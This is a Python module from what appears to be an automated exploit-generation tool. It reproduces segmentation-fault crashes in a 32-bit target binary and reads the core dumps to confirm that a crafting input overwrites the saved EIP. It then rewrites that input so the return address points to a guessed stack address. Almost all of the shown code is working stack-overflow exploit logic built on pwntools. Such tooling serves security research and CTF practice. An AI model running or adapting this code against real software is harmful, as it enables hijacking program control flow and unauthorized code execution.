from .utils import *
from .dataclass_utils import Target
from .exploit_utils import ENV_VARS


def reproducer(target: Target) -> bool:
    """
    Validates that the input causes a memory corruption crash by reproducing that crash.

    Parameters:
    crash_input: Initial input that will cause a memory corruption crash.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the program crashes with a segmentation fault.
    """

    # clear the /core_dumps directory for a clean start
    subprocess.Popen(
        "rm /core_dumps/*",
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
    )

    crash_input = target.target_input.content

    with open('mutation', 'wb') as f:
        f.write(crash_input)

    command = build_command(target)

    rep_proc = process(
        command, 
        shell=True,
        stdin=PTY, 
        stdout=PTY, 
        stderr=PTY, 
        raw=False, 
        env={**target.env, **ENV_VARS}
    )

    # rep_proc.send(b"\x04")
    # rep_proc.stdin.close()

    while rep_proc.poll() is None:
        # rep_proc.sendline()     #sendline as many times as needed because of the hyphen in the command. It asks input from stdin, runs in the inside of the pty so it might just hang if we dont send newlines
        rep_proc.wait(timeout=1)


    poll = rep_proc.poll()
    if poll == -11 or poll == 139:  #segfault
        int_process = rep_proc.pid + 2
        #+2 because the process with rep_proc.pid is the wrapper process interpreted by the shell from process(). The actual target repro process is a child of the external one
        #100% a dumb way to do this, must change it
        # core_path = f'/core_dumps/core.{target.name}.{int_process}'
        match = glob.glob(f'/core_dumps/core.*.{int_process}')

        if match and os.path.isfile(match[0]):
            return True

        else:
            logging.error("Core dump is missing")
            cleanup(1)

    else:
        logging.error("No memory corruption crash detected")
        cleanup(1)


def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
    """
    Triggers a test crash with the given input and extracts information from the resulting core dump.
    Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
    the return address, causing EIP hijacking.

    Parameters:
    crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the payload successfully reached and affected the return address.
    """

    # performs the crash

    target.target_input.content = crash_input
    if b'\x00' in crash_input:
        return None
    
    with open('mutation', 'wb') as f:
        f.write(crash_input)

    command = build_command(target)

    crash_proc = process(
        command, 
        shell=True,
        stdin=PTY,
        stdout=PTY, 
        stderr=PTY,
        raw=False,
        env={**target.env, **ENV_VARS}
    )

    # crash_proc.send(b"\x04")
    # crash_proc.stdin.close()

    while crash_proc.poll() is None:
        # crash_proc.sendline()
        crash_proc.wait(timeout=0.5)

    poll = crash_proc.poll()
    if poll != -11 and poll != 139:       # if not segfault
        # logging.error('in root cause analysis, payload mutation did not cause a crash for some reason. Investigating...')
        # return none when the input does not lead to a crash
        return None

    core_files = glob.glob(f'/core_dumps/core.*.*')
    int_process = crash_proc.pid + 2

    core_path = next((f for f in core_files if f.endswith(f".{int_process}")), None)

    if core_path is None:
        logging.error("In root cause analysis, previous crash did not generate a core dump")
        cleanup(1)

    core = Corefile(core_path)

    eip = core.eip.to_bytes(4, byteorder="little")


    # if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
    if eip in crash_input and not valid_stack_addr(core.eip, core.stack.start, core.stack.stop):
        return True

    # eip still has a valid value, so it wasn't overwritten by the payload. The program prematurely crashed and it did not reach the return address
    else:
        return False


def payload_builder(target: Target) -> None:
    """
    Generates the final payload (byte sequence) for the exploitation process and writes it to a file.
    Overwrites the bytes that fall on the return address with a valid target address on the existing crash input,
    appends a nopsled and finally the shellcode.

    Parameters:
    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
    target_bin: The binary file we want to exploit.
    """

    target_address = target_ra()

    payload = overwrite_ra(
        target.target_input.content, 
        struct.pack("<I", target_address)
    )

    open("payload", "wb").write(payload)

    return


def overwrite_ra(crash_input: bytes, target_address: bytes) -> bytes:
    """
    Rewrites a crashing input to replace the return address for EIP hijacking.
    The function extracts the EIP from a core dump, verifies it is present in the input,
    and replaces it with the target return address.

    Parameters:
    crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
    target_bin: The binary file we want to exploit.
    target_ra: The new return address to overwrite.
    """

    core_files = glob.glob(f"/core_dumps/core.*.*")
    core_files = sorted(core_files, key=lambda f: int(f.split(".")[-1]), reverse=True)

    core_path = core_files[0]

    core = Corefile(core_path)
    eip = core.eip.to_bytes(4, byteorder="little")

    if eip not in crash_input:
        logging.error("we have a problem")

    payload = crash_input.replace(eip, target_address)

    # interactive_gdb(target_bin, core_path, ENV_VARS)

    return payload


def target_ra() -> int:

    # find in what adresses the stack fluctuates -> info proc mapping

    core_files = glob.glob(f"/core_dumps/core.*.*")
    core_files = sorted(core_files, key=lambda f: int(f.split(".")[-1]), reverse=True)

    core_path = core_files[0]
    core = Corefile(core_path)

    # print(f"Stack Base: {hex(core.stack.start)}")
    # print(f"Stack Top: {hex(core.stack.stop)}")
    # print(f"env vars addr: {hex(core.envp_address)}")

    # must check if top, base and env addresses are valid before using them

    middle = (core.stack.start + core.stack.stop) // 2
    # middle = (core.envp_address + core.stack.stop) // 2
    #172 == \xac
    middle += 172

    return middle


def verify_eip_control(target: Target):

    # clean up previous core files
    subprocess.Popen(
        "rm /core_dumps/*",
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
    )

    crash_input = target.target_input.content
    with open('mutation', 'wb') as f:
        f.write(crash_input)

    command = build_command(target)

    rep_proc = process(
        command, 
        shell=True,
        stdin=PTY, 
        stdout=PTY, 
        stderr=PTY, 
        raw=False, 
        env={**target.env, **ENV_VARS}
    )
  
    # rep_proc.send(b"\x04")
    # rep_proc.stdin.close()

    while rep_proc.poll() is None:
        # rep_proc.sendline()
        rep_proc.wait(timeout=0.5)

    poll = rep_proc.poll()
    if poll != -11 and poll != 139:       # if not segfault
        pivot_logger.error('The crashing input failed to cause a crash.')
        sys.exit(1)

    int_process = rep_proc.pid + 2
    core_files = glob.glob(f'/core_dumps/core.*.*')

    core_path = next((f for f in core_files if f.endswith(f".{int_process}")), None)

    if core_path is None:
        logging.error("Verifying eip control, crash did not generate a core dump")
        cleanup(1)

    core = Corefile(core_path)
    eip = core.eip.to_bytes(4, byteorder="little")
    if eip not in crash_input:
        pivot_logger.error("The crashing input failed to take control of EIP.")
        cleanup(1)

    if b'\x00' in crash_input:
        pivot_logger.error('MUTATION CONTAINS NULL BYTES')

    return
